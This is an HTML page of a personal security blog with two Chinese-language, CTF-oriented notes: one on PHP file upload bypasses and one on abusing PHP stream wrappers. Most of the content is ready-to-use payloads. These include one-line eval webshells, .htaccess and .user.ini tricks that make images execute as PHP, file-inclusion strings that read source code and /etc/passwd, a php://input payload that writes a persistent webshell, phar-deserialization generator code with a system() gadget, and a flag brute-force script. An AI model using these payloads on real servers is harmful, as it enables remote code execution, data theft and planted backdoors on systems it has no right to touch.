@@ -1,0 +1,464 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 19 | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>n2ryx&#39;s Blog<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		Wish everything.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/07/20/Php/Upload/" >Php 文件上传</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-07-20  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Php-文件上传"><a href="#Php-文件上传" class="headerlink" title="Php 文件上传"></a>Php 文件上传</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// 一句话木马</span><br><span class="line">&lt;?php eval($_POST[&#x27;1&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?=eval($_POST[&#x27;1&#x27;]);?&gt;</span><br><span class="line">&lt;?=$_GET[0]($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// JavaScript</span><br><span class="line">GIF89a?</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&#x27;1&#x27;]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// .user.ini</span><br><span class="line">auto_prepend_file = xx.png	// 文件名</span><br><span class="line">或</span><br><span class="line">auto_prepend_file = &quot;php://filter/read=convert.base64-decode/resource=xx.png&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//.htaccess</span><br><span class="line">&lt;FilesMatch &quot;xx.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">或</span><br><span class="line">AddType application/x-httpd-php .jpg	// 文件类型</span><br><span class="line">或</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=xx.jpg&quot;</span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/07/20/Php/Upload/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/07/10/Php/伪协议/" >Php 伪协议</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-07-10  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Php-伪协议"><a href="#Php-伪协议" class="headerlink" title="Php 伪协议"></a>Php 伪协议</h1><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>协议作用</th>
+<th>用法举例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>http(s):&#x2F;&#x2F;</td>
+<td>这个不用多说，最常用的一个协议，用来访问http(s)网站</td>
+<td>?file&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></td>
+</tr>
+<tr>
+<td>file:&#x2F;&#x2F;</td>
+<td>访问本地文件系统</td>
+<td>?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</td>
+</tr>
+<tr>
+<td>php:&#x2F;&#x2F;</td>
+<td>访问各个输入&#x2F;输出流，包括php:&#x2F;&#x2F;filter,php:&#x2F;&#x2F;input等</td>
+<td>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xxx.php?file&#x3D;php:&#x2F;&#x2F;input [post data] <?php phpinfo()?></td>
+</tr>
+<tr>
+<td>phpar:&#x2F;&#x2F;</td>
+<td>php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压</td>
+<td>?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php</td>
+</tr>
+<tr>
+<td>zip:&#x2F;&#x2F;</td>
+<td>zip伪协议和phar协议类似，但是用法不一样</td>
+<td>?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名] zip:&#x2F;&#x2F;xxx.png#shell.php</td>
+</tr>
+<tr>
+<td>data:&#x2F;&#x2F;</td>
+<td>php:&#x2F;&#x2F;相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</td>
+<td>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</td>
+</tr>
+</tbody></table>
+<h2 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">allow_url_fopen:off/on</span><br><span class="line">allow_url_include :仅php://input php://stdin php://memory php://temp 需要on</span><br><span class="line"></span><br><span class="line">作用：</span><br><span class="line">php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</span><br><span class="line"></span><br><span class="line">说明</span><br><span class="line">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，</span><br><span class="line">内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span><br></pre></td></tr></table></figure>
+
+<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">条件</span><br><span class="line">需要开启 allow_url_fopen</span><br><span class="line">用法</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=xx.php</span><br><span class="line"></span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=xx.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">条件</span><br><span class="line">allow_url_fopen=on/off</span><br><span class="line">allow_url_include=on</span><br><span class="line">用法</span><br><span class="line">php://input + [POST DATA]执行php代码</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/include.php?filephp://input</span><br><span class="line">[POST DATA]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br><span class="line">若有写权限，可以写入一句话木马</span><br><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA]</span><br><span class="line">&lt;?php fputs(fopen(&#x27;aaa.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt; </span><br></pre></td></tr></table></figure>
+
+<h2 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><blockquote>
+<p>file:&#x2F;&#x2F; — 访问本地文件系统</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">条件</span><br><span class="line">allow_url_fopen=on/off</span><br><span class="line">allow_url_include=on/off </span><br><span class="line">用法</span><br><span class="line"></span><br><span class="line">?file=file://C:\Windows\System32\drivers\etc\hosts</span><br><span class="line">//读取本地文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><blockquote>
+<p>data:&#x2F;&#x2F; — 数据（RFC 2397）</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">条件</span><br><span class="line">此协议需要在双on的情况下才能使用，很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入</span><br><span class="line"></span><br><span class="line">用法</span><br><span class="line">data://text/plain;base64,base64编码字符 </span><br><span class="line">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line"></span><br><span class="line">data://text/plain,字符 </span><br><span class="line">http://127.0.0.1/cmd.php?file=data://text/plain,&lt;?php phpinfo()?&gt; plain后写要传入的内容。</span><br></pre></td></tr></table></figure>
+
+<h2 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h2><blockquote>
+<p>zlib:&#x2F;&#x2F; — 压缩流</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">条件</span><br><span class="line">allow_url_fopen和allow_url_include的启用与否无关系</span><br><span class="line"></span><br><span class="line">用法</span><br><span class="line">zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</span><br><span class="line">?file=zip://D:\phpstudy\WWW\x.zip%23shell.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h2><blockquote>
+<p>phar:&#x2F;&#x2F; — PHP 归档</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">条件</span><br><span class="line">allow_url_fopen和allow_url_include的启用与否无关系</span><br><span class="line">php版本大于等于5.3.0</span><br><span class="line">用法</span><br><span class="line"></span><br><span class="line">phar://压缩包名/内部文件名</span><br><span class="line">?file=phar://D:\phpstudy\WWW\x.zip/shell.php</span><br><span class="line"></span><br><span class="line">生成</span><br><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">触发phar反序列化漏洞：</span><br><span class="line">exif</span><br><span class="line">exif_thumbnail</span><br><span class="line">exif_imagetype</span><br><span class="line">gd</span><br><span class="line">imageloadfont</span><br><span class="line">imagecreatefrom***</span><br><span class="line">hash</span><br><span class="line">hash_hmac_file</span><br><span class="line">hash_file</span><br><span class="line">hash_update_file</span><br><span class="line">md5_file</span><br><span class="line">sha1_file</span><br><span class="line">file / url</span><br><span class="line">get_meta_tags</span><br><span class="line">get_headers</span><br><span class="line">standard</span><br><span class="line">getimagesize</span><br><span class="line">getimagesizefromstringfinfo_file/finfo_buffer/mime_content_type</span><br><span class="line"></span><br><span class="line">zip</span><br><span class="line">$zip = new ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(&#x27;c.zip&#x27;);</span><br><span class="line">$zip-&gt;extractTo(&#x27;phar://test.phar/test&#x27;);</span><br><span class="line"></span><br><span class="line">Bzip / Gzip</span><br><span class="line">当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过</span><br><span class="line">$z = &#x27;compress.bzip2://phar:///home/sx/test.phar/test.txt&#x27;;</span><br><span class="line">$z = &#x27;compress.zlib://phar:///home/sx/test.phar/test.txt&#x27;;</span><br><span class="line"></span><br><span class="line">配合其他协议，当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用</span><br><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br><span class="line"></span><br><span class="line">Postgres</span><br><span class="line">&lt;?php</span><br><span class="line">	$pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;));</span><br><span class="line">	@$pdo-&gt;pgsqlCopyFromFile(&#x27;aa&#x27;, &#x27;phar://phar.phar/aa&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">Mysql</span><br><span class="line">配置一下mysqld:</span><br><span class="line">[mysqld]</span><br><span class="line">local-infile=1</span><br><span class="line">secure_file_priv=&quot;&quot;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public $s = &#x27;&#x27;;</span><br><span class="line">    public function __wakeup () &#123;</span><br><span class="line">        system($this-&gt;s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);</span><br><span class="line">$s = mysqli_real_connect($m, &#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;root&#x27;, &#x27;testtable&#x27;, 3306);</span><br><span class="line">$p = mysqli_query($m, &#x27;LOAD DATA LOCAL INFILE \&#x27;phar://test.phar/test\&#x27; INTO TABLE a  LINES TERMINATED BY \&#x27;\r\n\&#x27;  IGNORE 1 LINES;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="glob"><a href="#glob" class="headerlink" title="glob:&#x2F;&#x2F;"></a>glob:&#x2F;&#x2F;</h2><blockquote>
+<p>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">echo new DirectoryIterator(&quot;glob://ext/spl/examples/*.php&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag = &#x27;backdoor_&#x27;</span><br><span class="line">dic = string.digits + string.ascii_letters + &#x27;_!-&#123;&#125;.&#x27;</span><br><span class="line">while 1:</span><br><span class="line">    for c in dic:</span><br><span class="line">        payload = f&#x27;glob://&#123;flag&#125;&#123;c&#125;*&#x27;</span><br><span class="line">        data = &#123;&#x27;file&#x27;: payload&#125;</span><br><span class="line">        url = &#x27;http://docker.nh0pe.top:33593/&#x27;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        if &#x27;yes&#x27; in res.text:</span><br><span class="line">            flag += c</span><br><span class="line">            print(c, flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/07/10/Php/伪协议/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/page/18/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+       <a href="/page/20/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/categories/Java/">Java<span>12</span></a></li>
+		
+			<li><a href="/categories/Linux/">Linux<span>1</span></a></li>
+		
+			<li><a href="/categories/Mysql/">Mysql<span>2</span></a></li>
+		
+			<li><a href="/categories/Network/">Network<span>1</span></a></li>
+		
+			<li><a href="/categories/Pentest/">Pentest<span>10</span></a></li>
+		
+			<li><a href="/categories/Php/">Php<span>4</span></a></li>
+		
+			<li><a href="/categories/Pollution/">Pollution<span>2</span></a></li>
+		
+			<li><a href="/categories/SSRF/">SSRF<span>1</span></a></li>
+		
+			<li><a href="/categories/Tool/">Tool<span>1</span></a></li>
+		
+			<li><a href="/categories/Vuln/">Vuln<span>3</span></a></li>
+		
+			<li><a href="/categories/Writeup/">Writeup<span>5</span></a></li>
+		
+		</ul>
+	</div>
+
+		
+			
+	<div class="widget">
+		<h4>Tag Cloud</h4>
+		<ul class="tag_box inline list-unstyled">		
+		
+			<li><a href="/tags/Log4j2/">Log4j2<span>1</span></a></li>
+		
+			<li><a href="/tags/JavaScript/">JavaScript<span>1</span></a></li>
+		
+			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
+		
+			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
+		
+			<li><a href="/tags/Python/">Python<span>1</span></a></li>
+		
+			<li><a href="/tags/Protocol/">Protocol<span>1</span></a></li>
+		
+			<li><a href="/tags/Upload/">Upload<span>1</span></a></li>
+		
+			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
+		
+			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
+		
+			<li><a href="/tags/BUUCTF/">BUUCTF<span>1</span></a></li>
+		
+			<li><a href="/tags/CTFshow/">CTFshow<span>1</span></a></li>
+		
+			<li><a href="/tags/Http/">Http<span>1</span></a></li>
+		
+			<li><a href="/tags/tunnel/">tunnel<span>1</span></a></li>
+		
+			<li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
+		
+			<li><a href="/tags/Priesc/">Priesc<span>2</span></a></li>
+		
+			<li><a href="/tags/CISCN/">CISCN<span>3</span></a></li>
+		
+			<li><a href="/tags/Inject/">Inject<span>1</span></a></li>
+		
+			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
+		
+			<li><a href="/tags/ssrf/">ssrf<span>1</span></a></li>
+		
+			<li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
+		
+		
+		   <li><a href="/tags">...<span>22</span></a></li>
+		 
+		</ul>
+	</div>
+
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2024/09/12/Tool/ligolo-ng/" ><i class="fa fa-file-o"></i>Ligolo-ng Note</a>
+      </li>
+    
+      <li>
+        <a href="/2024/08/02/Pentest/HTB/HTB Runner/" ><i class="fa fa-file-o"></i>HTB Runner</a>
+      </li>
+    
+      <li>
+        <a href="/2024/07/31/Pentest/HTB/HTB SolarLab/" ><i class="fa fa-file-o"></i>HTB SolarLab</a>
+      </li>
+    
+      <li>
+        <a href="/2024/07/26/Pentest/HTB/HTB IClean/" ><i class="fa fa-file-o"></i>HTB IClean</a>
+      </li>
+    
+      <li>
+        <a href="/2024/07/24/Pentest/HTB/HTB TwoMillion/" ><i class="fa fa-file-o"></i>HTB TwoMillion</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+			
+<div class="widget">
+	<h4>Links</h4>
+	<ul class="blogroll list-unstyled">
+	
+		<li><i class="false"></i><a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" title="" target="_blank"]);">hexo-theme-bithack</a></li>
+	
+	</ul>
+</div>
+
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
